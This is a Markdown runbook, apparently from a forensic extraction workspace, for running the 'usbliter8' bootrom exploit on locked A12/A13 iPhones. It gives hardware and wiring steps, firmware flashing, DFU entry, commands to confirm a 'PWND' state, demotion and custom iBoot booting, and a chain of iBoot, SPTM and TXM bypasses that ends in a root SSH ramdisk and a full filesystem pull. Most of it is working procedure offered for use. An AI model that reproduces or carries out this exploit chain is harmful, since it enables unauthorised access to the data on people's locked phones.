# usbliter8 runbook: GrayKey-class BFU extraction for A12/A13 (iPhone XS/XR/11, SE2)

First public bootrom route for A12/A13 (Paradigm Shift, 2026-06-18).
This is the same exploit class commercial tools (GrayKey/Magnet "MSG")
used for locked iPhone 11 extraction. Works in ANY device state
(BFU/AFU/locked/DFU). SEP-gated data (passcode-derived) stays gated.

Verified sources: `github.com/rav000/usbliter8` (mirror of the deleted
original), Paradigm Shift writeup `ps.tc/pages/blog-usbliter8.html`.

## Hardware needed (~$10-15)

- one RP2350-based board. Tested boards from upstream README:
  - Raspberry Pi Pico 2 (easiest to buy)
  - Waveshare RP2350 USB-A / RP2350 Zero
  - Pimoroni TINY2350
- Lightning cable (male) to wire the phone to the board. The tested
  boards use GPIO12 (D+) and GPIO13 (D-) for the USB host role.
  Waveshare RP2350 USB-A takes a standard USB-A to Lightning cable.
  For Pico 2 you cut a Lightning cable and solder D+/D- to GPIO12/13,
  GND to GND. Keep the Lightning end short.
- Optionally remove R13 on Waveshare RP2350 USB-A (host-mode fix,
  see qsantos.fr/2025/11/21/fixing-the-rp2350-usb-a-not-working-as-usb-host).
- DO NOT use USB-C cables (wrong pinout).

## Order of operations (do NOT skip)

1. Install host tooling (already staged on this machine):
   ```bash
   # usbliter8ctl + pyusb (verified working)
   pip install pyusb
   cp /tmp/usbliter8/usbliter8ctl ~/.local/bin/ && chmod +x ~/.local/bin/usbliter8ctl
   ```
2. Flash the board firmware (UF2 images in repo Releases):
   ```bash
   # put board in BOOTSEL (hold BOOTSEL, plug to PC), a disk "RP2350" appears
   cp usbliter8-<board>.uf2 /media/$USER/RP2350/
   ```
3. Verify LED: blinking orange ~2s = booting, steady orange = idle/ready.

4. Enter DFU on the iPhone (do NOT enter via breaking LLB):
   - iPhone 8/X/11: vol-up quick, vol-down quick, HOLD power until
     "connect to computer" (recovery), then power+vol-down 5s =
     black screen = DFU.
   - Verify with: `python3 -m opensleuth acquire dfu --out ~/cases/<case>`
     (watches USB; prints the moment DFU lands)

5. Unplug phone from PC, plug into the RP2350 board. Exploit runs in
   0.7-1.2s. RGB: blue = progress, GREEN = PWND. (Single-color: rapid
   blink = progress, steady = success.)

6. Replug phone to the PC. Confirm pwned DFU:
   ```bash
   python3 -m opensleuth acquire usbliter8 --out ~/cases/<case>
   # expect:  PWND:[usbliter8] CONFIRMED
   ```

7. Drive the pwned DFU:
   ```bash
   usbliter8ctl demote                # production -> dev mode (if needed)
   usbliter8ctl boot <raw-iBoot>      # boot custom iBoot / ramdisk chain
   ```
   For the full extraction chain use the community `usbliter8ra1n`
   toolkit (iBoot patch, SPTM bypass, TXM bypass, kernel patchfinder,
   SSH ramdisk): installs SSH to the ramdisk -> then:
   ```bash
   python3 -m opensleuth acquire jailbroken --out ~/cases/<case>/fs --ssh root@<iphone-ip>
   ```

## Notes / caveats

- Tethered: after the chain you keep the device on the ramdisk. Reboot
  returns it to stock; re-run the flow for another session.
- SEP untouched: passcode-derived keychain/class keys stay fused. You
  get full filesystem (ramdisk SSH) + BFU-partial keybags; full
  keychain needs AFU/passcode.
- A12X/A12Z theoretically supported but NOT implemented upstream.
- On A13, RP2040 (older Pico) does NOT work reliably (upstream note).

## Long-term acquisition flow (when board arrives)

```
case start -> acquire bfu (record locked state)
  -> DFU entry (watcher) -> RP2350 flash -> PWND
  -> usbliter8ctl demote/boot -> usbliter8ra1n ramdisk SSH
  -> acquire jailbroken --ssh -> full FS pull
  -> report (opensleuth dump)
```